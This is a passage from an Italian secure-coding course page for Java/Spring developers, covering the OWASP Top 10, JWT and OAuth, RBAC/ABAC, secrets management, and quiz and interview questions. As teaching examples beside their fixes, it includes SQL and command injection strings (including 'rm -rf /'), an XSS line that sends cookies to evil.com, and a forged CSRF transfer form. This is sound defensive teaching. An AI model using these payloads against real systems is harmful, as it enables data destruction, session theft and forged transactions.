                    <h4>Q: Quali sono i problemi principali di GraphQL e come li risolvi?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Query N+1: il resolver per "orders" fa N query per gli "items". Soluzione: DataLoader per batching e caching. 2) Query complexity attack: client può richiedere query profondamente nested che sovraccaricano il server. Soluzione: query depth limiting, complexity scoring, timeout. 3) Caching: POST su endpoint unico rompe HTTP cache. Soluzione: persisted queries (hash → query), caching a livello di resolver o CDN con @cacheControl directive. 4) Security: introspection espone lo schema. In produzione, disabilitalo o limitalo.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come documenti un'API REST?</h4>
                    <p><strong>Risposta attesa:</strong> Uso OpenAPI (Swagger) 3.0 come standard. Due approcci: 1) Code-first: annotazioni nel codice (SpringDoc/Springfox) generano lo spec automaticamente. Pro: sempre sincronizzato. Contro: spec derivato dal codice, meno controllo. 2) Spec-first: scrivo lo YAML OpenAPI prima, poi genero code/stub. Pro: design-first, contratto chiaro. Contro: rischio drift. Complemento con: esempi di richieste reali, error codes documentati, Postman collection per testing interattivo, changelog per versioni.</p>
                </div>
            </section>

            <!-- Links Modulo 9 -->
            <section class="section" id="modulo9-links">
                <h2>Link di Approfondimento - Modulo 9</h2>

                <div class="info-box">
                    <h4>REST API Design</h4>
                    <p><a href="https://restfulapi.net/" target="_blank">RESTful API Tutorial</a></p>
                    <p><a href="https://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm" target="_blank">Roy Fielding's Dissertation</a> - REST originale</p>
                    <p><a href="https://github.com/microsoft/api-guidelines" target="_blank">Microsoft REST API Guidelines</a></p>
                    <p><a href="https://docs.github.com/en/rest" target="_blank">GitHub REST API</a> - Esempio di buona API</p>
                </div>

                <div class="info-box">
                    <h4>OpenAPI & Documentation</h4>
                    <p><a href="https://swagger.io/specification/" target="_blank">OpenAPI Specification</a></p>
                    <p><a href="https://springdoc.org/" target="_blank">SpringDoc OpenAPI</a></p>
                    <p><a href="https://www.baeldung.com/spring-rest-openapi-documentation" target="_blank">Baeldung: OpenAPI with Spring</a></p>
                </div>

                <div class="info-box">
                    <h4>GraphQL</h4>
                    <p><a href="https://graphql.org/learn/" target="_blank">GraphQL Official Learn</a></p>
                    <p><a href="https://www.howtographql.com/" target="_blank">How to GraphQL</a> - Tutorial completo</p>
                    <p><a href="https://www.baeldung.com/spring-graphql" target="_blank">Baeldung: GraphQL with Spring</a></p>
                </div>

                <div class="info-box">
                    <h4>gRPC</h4>
                    <p><a href="https://grpc.io/docs/" target="_blank">gRPC Documentation</a></p>
                    <p><a href="https://www.baeldung.com/grpc-introduction" target="_blank">Baeldung: Introduction to gRPC</a></p>
                    <p><a href="https://protobuf.dev/" target="_blank">Protocol Buffers</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 10: SECURITY ==================== -->

            <header class="module-header" id="modulo10">
                <span class="module-tag">Modulo 10</span>
                <h1>Security</h1>
                <p>OWASP Top 10, Authentication, Authorization e secure coding practices</p>
            </header>

            <!-- OWASP Top 10 Section -->
            <section class="section" id="modulo10-owasp">
                <h2>OWASP Top 10: Le Vulnerabilità Più Critiche</h2>

                <p>L'<strong>OWASP Top 10</strong> è la lista delle vulnerabilità di sicurezza più critiche per le applicazioni web. Conoscerle è fondamentale per ogni developer.</p>

                <h3>1. Injection (SQL, NoSQL, Command)</h3>

                <p>L'<strong>injection</strong> avviene quando dati non fidati vengono inviati a un interprete come parte di un comando o query. L'attaccante può eseguire comandi non autorizzati o accedere a dati.</p>

                <pre><code class="language-java">// ❌ VULNERABILE: SQL Injection
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    // Se username = "admin'; DROP TABLE users; --"
    // Query diventa: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
    return jdbcTemplate.queryForObject(query, userMapper);
}

// ✅ SICURO: Prepared Statement con parametri
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(query, userMapper, username);
}

// ✅ SICURO: JPA/Hibernate con parametri named
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// ❌ VULNERABILE: Command Injection
public void processFile(String filename) {
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");
    // Se filename = "file.txt; rm -rf /"
}

// ✅ SICURO: Usa ProcessBuilder con array di argomenti
public void processFile(String filename) {
    ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
    pb.start();  // Gli argomenti sono separati, non interpretati dalla shell
}</code></pre>

                <h3>2. Broken Authentication</h3>

                <p>Autenticazione debole o mal implementata permette agli attaccanti di compromettere password, chiavi o token di sessione.</p>

                <div class="info-box warning">
                    <h4>Errori Comuni</h4>
                    <ul>
                        <li>Password in chiaro o con hashing debole (MD5, SHA1)</li>
                        <li>Session ID prevedibile o esposto nell'URL</li>
                        <li>Nessun rate limiting su login (permette brute force)</li>
                        <li>Token che non scadono mai</li>
                        <li>Password reset insicuro (token prevedibile, no expiry)</li>
                    </ul>
                </div>

                <pre><code class="language-java">// ❌ SBAGLIATO: Hashing debole
String hashedPassword = DigestUtils.md5Hex(password);  // MD5 è crackabile in secondi

// ✅ CORRETTO: BCrypt con salt automatico
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // Work factor 12 (2^12 iterazioni)
}

// Uso
String hashedPassword = passwordEncoder.encode(rawPassword);
boolean matches = passwordEncoder.matches(rawPassword, hashedPassword);</code></pre>

                <h3>3. Cross-Site Scripting (XSS)</h3>

                <p><strong>XSS</strong> avviene quando un'applicazione include dati non fidati in una pagina web senza validazione. L'attaccante può eseguire script nel browser della vittima.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TIPI DI XSS                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  STORED XSS (Persistente)                                                   │
│  ─────────────────────────                                                   │
│  1. Attacker salva script malevolo nel database (es. commento)              │
│  2. Server serve la pagina con lo script                                    │
│  3. Browser della vittima esegue lo script                                  │
│  Esempio: Commento con &lt;script&gt;document.location='evil.com?c='+cookie&lt;/script&gt;│
│                                                                              │
│  REFLECTED XSS                                                              │
│  ──────────────                                                              │
│  1. Attacker invia URL malevolo alla vittima                                │
│  2. Il parametro URL viene riflesso nella risposta senza escape             │
│  3. Browser esegue lo script                                                │
│  Esempio: /search?q=&lt;script&gt;alert('xss')&lt;/script&gt;                           │
│                                                                              │
│  DOM-BASED XSS                                                              │
│  ──────────────                                                              │
│  Lo script malevolo manipola il DOM client-side                             │
│  Il payload non passa mai dal server                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// ❌ VULNERABILE: Output non escaped
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // Se q contiene &lt;script&gt;, verrà eseguito
    return "search";
}

// Template Thymeleaf vulnerabile
&lt;p&gt;Risultati per: &lt;span th:utext="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // utext = unescaped!

// ✅ SICURO: Escape automatico
&lt;p&gt;Risultati per: &lt;span th:text="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // text = escaped
// &lt;script&gt; diventa &amp;lt;script&amp;gt;

// ✅ SICURO: Content Security Policy header
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'")
            )
        );
        return http.build();
    }
}</code></pre>

                <h3>4. Cross-Site Request Forgery (CSRF)</h3>

                <p><strong>CSRF</strong> forza un utente autenticato a eseguire azioni indesiderate. L'attaccante sfrutta il fatto che il browser invia automaticamente i cookie di sessione.</p>

                <pre><code class="language-html">&lt;!-- Pagina malevola dell'attacker --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amount=10000" /&gt;
&lt;!-- Il browser invia i cookie di bank.com → trasferimento eseguito! --&gt;

&lt;!-- Form nascosto che si auto-submittà --&gt;
&lt;form action="https://bank.com/transfer" method="POST" id="evil"&gt;
    &lt;input name="to" value="attacker"&gt;
    &lt;input name="amount" value="10000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('evil').submit();&lt;/script&gt;</code></pre>

                <pre><code class="language-java">// ✅ PROTEZIONE: CSRF Token (Spring Security lo abilita di default)
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}

// Il form deve includere il token
&lt;form method="POST"&gt;
    &lt;input type="hidden" name="_csrf" th:value="${_csrf.token}"/&gt;
    ...
&lt;/form&gt;

// Per API stateless (JWT), CSRF non è necessario se:
// - Non usi cookie per l'auth
// - Usi Authorization header con Bearer token</code></pre>

                <h3>5. Security Misconfiguration</h3>

                <div class="info-box warning">
                    <h4>Errori di Configurazione Comuni</h4>
                    <ul>
                        <li>Stack trace esposti in produzione</li>
                        <li>Directory listing abilitato</li>
                        <li>Credenziali di default non cambiate</li>
                        <li>Headers di sicurezza mancanti</li>
                        <li>CORS troppo permissivo (<code>Access-Control-Allow-Origin: *</code>)</li>
                        <li>Debug/admin endpoint esposti in produzione</li>
                    </ul>
                </div>

                <pre><code class="language-yaml"># application-prod.yml - Configurazione sicura
server:
  error:
    include-stacktrace: never      # Mai esporre stack trace
    include-message: never

spring:
  devtools:
    restart:
      enabled: false               # Disabilita in prod
  h2:
    console:
      enabled: false               # Disabilita console H2

management:
  endpoints:
    web:
      exposure:
        include: health, info      # Solo endpoint necessari
  endpoint:
    health:
      show-details: never          # Non esporre dettagli interni</code></pre>

                <pre><code class="language-java">// Security Headers
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // Previene clickjacking
        .frameOptions(frame -> frame.deny())
        // Previene MIME sniffing
        .contentTypeOptions(Customizer.withDefaults())
        // Forza HTTPS
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000)
            .includeSubDomains(true)
        )
        // Referrer policy
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
        )
    );
    return http.build();
}</code></pre>
            </section>

            <!-- Authentication Section -->
            <section class="section" id="modulo10-auth">
                <h2>Authentication: Session vs Token</h2>

                <h3>Session-Based Authentication</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SESSION-BASED AUTHENTICATION                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Client                            Server                    Session Store  │
│    │                                  │                           │         │
│    │ 1. POST /login                   │                           │         │
│    │    {user, password}              │                           │         │
│    │─────────────────────────────────▶│                           │         │
│    │                                  │                           │         │
│    │                                  │ 2. Verifica credenziali   │         │
│    │                                  │ 3. Crea session           │         │
│    │                                  │──────────────────────────▶│         │
│    │                                  │    sessionId: abc123      │         │
│    │                                  │    userId: 42             │         │
│    │                                  │    roles: [ADMIN]         │         │
│    │                                  │◀──────────────────────────│         │
│    │ 4. Set-Cookie: JSESSIONID=abc123│                           │         │
│    │◀─────────────────────────────────│                           │         │
│    │                                  │                           │         │
│    │ 5. GET /api/data                 │                           │         │
│    │    Cookie: JSESSIONID=abc123     │                           │         │
│    │─────────────────────────────────▶│                           │         │
│    │                                  │ 6. Lookup session         │         │
│    │                                  │──────────────────────────▶│         │
│    │                                  │◀──────────────────────────│         │
│    │ 7. 200 OK {data}                 │                           │         │
│    │◀─────────────────────────────────│                           │         │
│                                                                              │
│  Pro: ✓ Revoca istantanea, ✓ Sicurezza (HttpOnly cookie)                   │
│  Contro: ✗ Richiede session store condiviso, ✗ Non adatto a microservizi   │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Token-Based Authentication (JWT)</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    JWT AUTHENTICATION                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Client                            Server                                    │
│    │                                  │                                      │
│    │ 1. POST /login                   │                                      │
│    │    {user, password}              │                                      │
│    │─────────────────────────────────▶│                                      │
│    │                                  │                                      │
│    │                                  │ 2. Verifica credenziali              │
│    │                                  │ 3. Genera JWT (signed)               │
│    │                                  │                                      │
│    │ 4. {accessToken, refreshToken}   │                                      │
│    │◀─────────────────────────────────│                                      │
│    │                                  │                                      │
│    │ 5. GET /api/data                 │                                      │
│    │    Authorization: Bearer &lt;JWT&gt;   │                                      │
│    │─────────────────────────────────▶│                                      │
│    │                                  │ 6. Verifica firma JWT                │
│    │                                  │    (NO database lookup!)             │
│    │ 7. 200 OK {data}                 │                                      │
│    │◀─────────────────────────────────│                                      │
│                                                                              │
│  Pro: ✓ Stateless, ✓ Scalabile, ✓ Cross-domain                             │
│  Contro: ✗ No revoca istantanea, ✗ Token size, ✗ XSS se in localStorage    │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>JWT Deep Dive</h3>

                <pre><code class="language-java">// Struttura JWT: header.payload.signature
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
// eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
// SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Header (Base64)
{
  "alg": "HS256",    // Algoritmo di firma
  "typ": "JWT"
}

// Payload (Base64) - Claims
{
  "sub": "user123",           // Subject (user ID)
  "name": "John Doe",         // Custom claim
  "email": "john@example.com",
  "roles": ["USER", "ADMIN"], // Custom claim
  "iat": 1706439600,          // Issued At
  "exp": 1706443200,          // Expiration (1 ora)
  "iss": "auth.example.com"   // Issuer
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)</code></pre>

                <pre><code class="language-java">// Implementazione Spring Boot con jjwt
@Service
public class JwtService {
    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration}")
    private long expiration;

    public String generateToken(UserDetails user) {
        Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();
        claims.put("roles", user.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .toList());

        return Jwts.builder()
            .setClaims(claims)
            .setSubject(user.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parserBuilder()
                .setSigningKey(getSigningKey())
                .build()
                .parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;  // Expired, invalid signature, malformed
        }
    }

    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    private SecretKey getSigningKey() {
        return Keys.hmacShaKeyFor(secret.getBytes());
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>JWT Security Best Practices</h4>
                    <ul>
                        <li><strong>Short expiration</strong>: Access token 15min, refresh token 7 days</li>
                        <li><strong>Algoritmo sicuro</strong>: HS256 minimo, RS256 per scenari multi-service</li>
                        <li><strong>Non mettere dati sensibili</strong>: Il payload è solo encoded, non encrypted</li>
                        <li><strong>Usa HttpOnly cookie</strong> per refresh token, localStorage è vulnerabile a XSS</li>
                        <li><strong>Implementa token rotation</strong>: Nuovo refresh token ad ogni uso</li>
                        <li><strong>Blacklist per logout</strong>: Traccia token revocati (se necessario)</li>
                    </ul>
                </div>

                <h3>OAuth 2.0 Flows</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    OAUTH 2.0 AUTHORIZATION CODE FLOW                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  User        Client App       Authorization Server      Resource Server     │
│   │              │                    │                       │             │
│   │ 1. Click     │                    │                       │             │
│   │   "Login"    │                    │                       │             │
│   │─────────────▶│                    │                       │             │
│   │              │                    │                       │             │
│   │ 2. Redirect to Auth Server        │                       │             │
│   │◀─────────────│                    │                       │             │
│   │   /authorize?client_id=...        │                       │             │
│   │              &redirect_uri=...    │                       │             │
│   │              &scope=read+write    │                       │             │
│   │              &state=xyz           │                       │             │
│   │                                   │                       │             │
│   │ 3. Login + Consent               │                       │             │
│   │─────────────────────────────────▶│                       │             │
│   │                                   │                       │             │
│   │ 4. Redirect back with code        │                       │             │
│   │◀──────────────────────────────────│                       │             │
│   │   /callback?code=AUTH_CODE        │                       │             │
│   │                                   │                       │             │
│   │              │ 5. Exchange code   │                       │             │
│   │              │    for tokens      │                       │             │
│   │              │───────────────────▶│                       │             │
│   │              │                    │                       │             │
│   │              │ 6. {access_token,  │                       │             │
│   │              │     refresh_token} │                       │             │
│   │              │◀───────────────────│                       │             │
│   │              │                    │                       │             │
│   │              │ 7. GET /api/data   │                       │             │
│   │              │    Authorization: Bearer token             │             │
│   │              │───────────────────────────────────────────▶│             │
│   │              │                    │                       │             │
│   │              │ 8. {data}          │                       │             │
│   │              │◀───────────────────────────────────────────│             │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Authorization Section -->
            <section class="section" id="modulo10-authorization">
                <h2>Authorization: RBAC vs ABAC</h2>

                <h3>RBAC (Role-Based Access Control)</h3>

                <p>In <strong>RBAC</strong>, i permessi sono assegnati a ruoli, e gli utenti sono assegnati a ruoli. Semplice ma può diventare rigido con requisiti complessi.</p>

                <pre><code class="language-java">// Spring Security RBAC
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .requestMatchers("/api/users/**").hasAnyRole("ADMIN", "USER_MANAGER")
            .requestMatchers("/api/reports/**").hasAuthority("REPORT_VIEW")
            .requestMatchers("/public/**").permitAll()
            .anyRequest().authenticated()
        );
        return http.build();
    }
}

// Method-level security
@Service
public class UserService {

    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(Long id) { ... }

    @PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
    public User getUser(Long userId) { ... }  // Admin o owner

    @PostAuthorize("returnObject.department == authentication.principal.department")
    public Document getDocument(Long id) { ... }  // Filtra dopo l'esecuzione
}</code></pre>

                <h3>ABAC (Attribute-Based Access Control)</h3>

                <p><strong>ABAC</strong> decide l'accesso basandosi su attributi di utente, risorsa, ambiente. Più flessibile ma più complesso.</p>

                <pre><code class="language-java">// ABAC con Spring Security SpEL
@PreAuthorize("""
    hasRole('DOCTOR') and
    #patient.assignedDoctorId == authentication.principal.id and
    T(java.time.LocalTime).now().isAfter(T(java.time.LocalTime).of(8, 0)) and
    T(java.time.LocalTime).now().isBefore(T(java.time.LocalTime).of(18, 0))
""")
public MedicalRecord accessPatientRecord(Patient patient) {
    // Solo il dottore assegnato, durante orario lavorativo
}

// Custom Permission Evaluator per logica complessa
@Component
public class CustomPermissionEvaluator implements PermissionEvaluator {

    @Override
    public boolean hasPermission(Authentication auth, Object target, Object permission) {
        if (target instanceof Document doc) {
            User user = (User) auth.getPrincipal();

            return switch ((String) permission) {
                case "READ" -> canRead(user, doc);
                case "WRITE" -> canWrite(user, doc);
                case "DELETE" -> canDelete(user, doc);
                default -> false;
            };
        }
        return false;
    }

    private boolean canRead(User user, Document doc) {
        // Logica complessa: owner, shared with, public, same department, etc.
        return doc.isPublic() ||
               doc.getOwnerId().equals(user.getId()) ||
               doc.getSharedWith().contains(user.getId()) ||
               (doc.getDepartment().equals(user.getDepartment()) &&
                user.hasPermission("DEPT_DOCS_READ"));
    }
}

// Uso
@PreAuthorize("hasPermission(#doc, 'READ')")
public Document getDocument(Document doc) { ... }</code></pre>

                <h3>Secrets Management</h3>

                <div class="info-box warning">
                    <h4>MAI Fare Questo</h4>
                    <ul>
                        <li>Hardcodare secrets nel codice</li>
                        <li>Committare secrets in Git (anche in repo privati)</li>
                        <li>Passare secrets come argomenti command line (visibili in ps)</li>
                        <li>Loggare secrets</li>
                    </ul>
                </div>

                <pre><code class="language-yaml"># ✅ CORRETTO: Environment variables (12-factor app)
spring:
  datasource:
    password: ${DB_PASSWORD}

# ✅ CORRETTO: Spring Cloud Config + Vault
spring:
  cloud:
    vault:
      uri: https://vault.example.com
      authentication: KUBERNETES
      kubernetes:
        role: my-app
      kv:
        backend: secret
        default-context: my-app

# ✅ CORRETTO: AWS Secrets Manager
@Value("${aws.secretsmanager.secret-name}")
private String secretName;

// Kubernetes Secrets
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  password: cGFzc3dvcmQxMjM=  # Base64 encoded

# Mount come env var nel pod
env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-credentials
        key: password</code></pre>
            </section>

            <!-- Quiz Section Modulo 10 -->
            <section class="quiz-section" id="modulo10-quiz">
                <h2>Interactive Challenge Quiz - Modulo 10</h2>
                <p>Verifica la tua comprensione della Security.</p>

                <!-- Question 46 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un'applicazione usa <code>SELECT * FROM users WHERE id = '" + userId + "'"</code>. L'attacker invia userId = <code>1' OR '1'='1</code>. Cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q46" id="q46a" value="a">
                            <label for="q46a">Errore SQL: la query non è valida</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q46" id="q46b" value="b">
                            <label for="q46b">Ritorna solo l'utente con ID '1' OR '1'='1'</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q46" id="q46c" value="c">
                            <label for="q46c">Ritorna TUTTI gli utenti (bypass autenticazione)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q46" id="q46d" value="d">
                            <label for="q46d">Il database blocca automaticamente l'injection</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q46')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q46"></div>
                </div>

                <!-- Question 47 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Un JWT è stato rubato. Come impedisci che l'attacker lo usi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q47" id="q47a" value="a">
                            <label for="q47a">Cambia la secret key del server</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q47" id="q47b" value="b">
                            <label for="q47b">Implementa una blacklist di token revocati</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q47" id="q47c" value="c">
                            <label for="q47c">Aspetta che scada naturalmente</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q47" id="q47d" value="d">
                            <label for="q47d">I JWT non possono essere rubati se firmati</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q47')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q47"></div>
                </div>

                <!-- Question 48 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Un form permette agli utenti di inserire una bio. Come previeni Stored XSS?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q48" id="q48a" value="a">
                            <label for="q48a">Escape dell'output HTML quando renderizzi la bio</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q48" id="q48b" value="b">
                            <label for="q48b">Validazione input: rifiuta qualsiasi carattere speciale</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q48" id="q48c" value="c">
                            <label for="q48c">Usa HTTPS per cifrare i dati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q48" id="q48d" value="d">
                            <label for="q48d">Implementa rate limiting sul form</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q48')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q48"></div>
                </div>

                <!-- Question 49 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> La tua API REST stateless usa JWT in Authorization header. Devi implementare protezione CSRF?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q49" id="q49a" value="a">
                            <label for="q49a">Sì, CSRF è sempre necessario per le API</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q49" id="q49b" value="b">
                            <label for="q49b">Sì, perché JWT può essere rubato con CSRF</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q49" id="q49c" value="c">
                            <label for="q49c">Solo se l'API è accessibile da browser</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q49" id="q49d" value="d">
                            <label for="q49d">No, CSRF sfrutta i cookie automatici. Authorization header non è automatico</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q49')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q49"></div>
                </div>

                <!-- Question 50 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Quale algoritmo di hashing password è raccomandato nel 2026?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q50" id="q50a" value="a">
                            <label for="q50a">SHA-256 con salt random</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q50" id="q50b" value="b">
                            <label for="q50b">MD5 con HMAC</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q50" id="q50c" value="c">
                            <label for="q50c">BCrypt, Argon2, o scrypt (adaptive hashing)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q50" id="q50d" value="d">
                            <label for="q50d">AES-256 encryption</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q50')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q50"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 10 -->
            <section class="section" id="modulo10-questions">
                <h2>Domande da Colloquio - Modulo 10</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra autenticazione e autorizzazione.</h4>
                    <p><strong>Risposta attesa:</strong> L'autenticazione verifica CHI sei (identità): username/password, token, certificato. L'autorizzazione verifica COSA puoi fare (permessi): una volta autenticato, quali risorse puoi accedere? Esempio: login con credenziali = autenticazione. Controllo se puoi eliminare un utente = autorizzazione. Spring Security li separa: AuthenticationManager per autenticazione, AccessDecisionManager per autorizzazione. HTTP status: 401 = non autenticato, 403 = autenticato ma non autorizzato.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come preveniresti SQL Injection in un'applicazione Java?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Prepared Statements con parametri bind: <code>PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); ps.setInt(1, userId);</code>. Il database tratta il parametro come dato, mai come codice. 2) Con JPA/Hibernate: named parameters <code>@Query("SELECT u FROM User u WHERE u.id = :id")</code>. 3) Validazione input come layer aggiuntivo (whitelist, type checking). 4) Principle of least privilege: l'utente DB ha solo i permessi necessari. MAI concatenare stringhe per costruire query.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Session vs JWT: quali sono i trade-off?</h4>
                    <p><strong>Risposta attesa:</strong> Session: Pro - revoca istantanea (cancella session), HttpOnly cookie sicuro contro XSS. Contro - richiede session store condiviso (Redis) per scaling, sticky sessions o distributed cache. JWT: Pro - stateless, nessun lookup DB, scala orizzontalmente, ottimo per microservizi e cross-domain. Contro - no revoca istantanea (devi implementare blacklist), payload size maggiore, se rubato è valido fino a scadenza. Scelta: monolite con session, microservizi con JWT. Ibrido: JWT per access (short-lived), session/cookie per refresh (revocabile).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestiresti i secrets in un ambiente Kubernetes?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Kubernetes Secrets base: meglio di hardcoded ma sono solo base64 encoded, non encrypted. 2) Sealed Secrets (Bitnami): encrypted con chiave del cluster, safe to commit. 3) External Secrets Operator: sincronizza da AWS Secrets Manager, Vault, etc. 4) HashiCorp Vault con injector sidecar: secrets iniettati come file o env vars. 5) SOPS per encryption at rest dei secret files. Best practice: secrets come env vars (non file), rotation automatica, audit logging, least privilege access. Mai loggare secrets.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Cosa sono e come previeni XSS?</h4>
                    <p><strong>Risposta attesa:</strong> XSS (Cross-Site Scripting): l'attacker inietta script malevolo che viene eseguito nel browser della vittima. Tipi: Stored (script salvato in DB), Reflected (script nell'URL riflesso nella risposta), DOM-based (manipolazione DOM client-side). Prevenzione: 1) Output encoding/escaping: tutto l'output user-generated deve essere escaped per il contesto (HTML, JS, URL). 2) Content Security Policy (CSP): header che blocca inline scripts. 3) HttpOnly cookies: JS non può accedere ai cookie di sessione. 4) Validazione input (whitelist). In Spring: Thymeleaf usa th:text (escaped) di default, evitare th:utext.</p>
                </div>
            </section>

            <!-- Links Modulo 10 -->
            <section class="section" id="modulo10-links">
                <h2>Link di Approfondimento - Modulo 10</h2>

                <div class="info-box">
                    <h4>OWASP</h4>
                    <p><a href="https://owasp.org/Top10/" target="_blank">OWASP Top 10</a> - Le vulnerabilità più critiche</p>
                    <p><a href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a> - Guide pratiche</p>
